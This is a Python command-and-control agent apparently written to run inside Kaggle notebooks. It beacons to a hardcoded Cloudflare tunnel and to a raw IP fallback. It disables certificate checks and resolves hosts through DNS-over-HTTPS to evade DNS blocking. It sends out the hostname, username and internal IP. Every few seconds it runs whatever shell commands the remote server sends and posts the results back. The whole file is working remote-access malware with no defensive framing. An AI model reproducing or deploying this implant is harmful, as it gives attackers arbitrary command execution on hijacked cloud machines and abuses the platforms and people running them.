import os, sys, json, time, socket, platform, subprocess, uuid, threading, ssl
from urllib.request import Request, urlopen, HTTPSHandler, build_opener
import http.client

# Multiple C2 URLs with fallback - use IP directly to bypass DNS
C2_URLS = [
    "https://separated-dns-auto-lately.trycloudflare.com",
    "https://193.3.55.243:8443",  # Direct IP fallback
]
C2_URL = C2_URLS[0]
AGENT_ID = str(uuid.uuid4())

# DNS-over-HTTPS resolver for Kaggle (blocks DNS)
def doh_resolve(hostname):
    """Resolve hostname via DNS-over-HTTPS (Cloudflare DoH)"""
    try:
        import base64
        import struct
        # DoH endpoint
        doh_url = "https://1.1.1.1/dns-query"
        
        # Build DNS query
        query_id = 0x0000
        flags = 0x0100  # Standard query
        questions = 1
        
        # Build question
        qname = b''
        for part in hostname.split('.'):
            qname += bytes([len(part)]) + part.encode()
        qname += b'\x00'
        qtype = 1  # A record
        qclass = 1  # IN
        
        query = struct.pack('>HHHHHH', query_id, flags, questions, 0, 0, 0)
        query += qname + struct.pack('>HH', qtype, qclass)
        
        # Base64url encode
        encoded = base64.urlsafe_b64encode(query).decode().rstrip('=')
        
        # DoH GET request
        req = Request(f"{doh_url}?dns={encoded}", headers={
            'Accept': 'application/dns-message',
            'User-Agent': 'curl'
        })
        
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        opener = build_opener(HTTPSHandler(context=ctx))
        resp = opener.open(req, timeout=10)
        dns_response = resp.read()
        
        # Parse response for A record
        # Skip header (12 bytes) and question section
        pos = 12
        while pos < len(dns_response):
            if dns_response[pos] == 0:
                pos += 5  # Skip null terminator + QTYPE + QCLASS
                break
            pos += dns_response[pos] + 1
        pos += 4
        
        # Parse answer section
        ancount = struct.unpack('>H', dns_response[4:6])[0]
        for _ in range(ancount):
            # Skip name (might be compressed)
            if dns_response[pos] >= 0xc0:
                pos += 2
            else:
                while dns_response[pos] != 0:
                    pos += dns_response[pos] + 1
                pos += 1
            
            rtype, rclass, ttl, rdlength = struct.unpack('>HHIH', dns_response[pos:pos+10])
            pos += 10
            
            if rtype == 1 and rdlength == 4:  # A record
                ip = '.'.join(str(b) for b in dns_response[pos:pos+4])
                return ip
            pos += rdlength
        
        return None
    except Exception as e:
        print(f"[DoH] Failed: {e}")
        return None

def http_post(path, data, url_index=0):
    global C2_URL
    if url_index >= len(C2_URLS):
        raise Exception("All C2 URLs failed")
    
    C2_URL = C2_URLS[url_index]
    payload = json.dumps(data).encode()
    
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        req = Request(f"{C2_URL}{path}", data=payload, headers={"Content-Type": "application/json"})
        opener = build_opener(HTTPSHandler(context=ctx))
        return json.loads(opener.open(req, timeout=30).read())
    except Exception as e:
        print(f"[C2] URL {url_index} failed: {e}")
        time.sleep(2)
        return http_post(path, data, url_index + 1)

def register():
    info = {"id": AGENT_ID, "hostname": f"kaggle-{socket.gethostname()}", "username": os.popen("whoami").read().strip(), "os": f"Kaggle {platform.system()}", "arch": platform.machine(), "ip_internal": socket.gethostbyname(socket.gethostname()), "platform_type": "kaggle"}
    return http_post("/api/agent/register", info)

def beacon_loop():
    while True:
        try:
            resp = http_post("/api/agent/beacon", {"id": AGENT_ID})
            for task in resp.get("tasks", []):
                result = subprocess.check_output(task.get("payload", ""), shell=True, stderr=subprocess.STDOUT, timeout=300).decode(errors="replace")
                http_post("/api/agent/result", {"task_id": task["id"], "result": result[:65000]})
        except: pass
        time.sleep(5)

print("[C2 Agent] Starting...")
register()
print(f"[C2 Agent] Connected to {C2_URL} as {AGENT_ID}")
threading.Thread(target=beacon_loop, daemon=True).start()
while True: time.sleep(60)
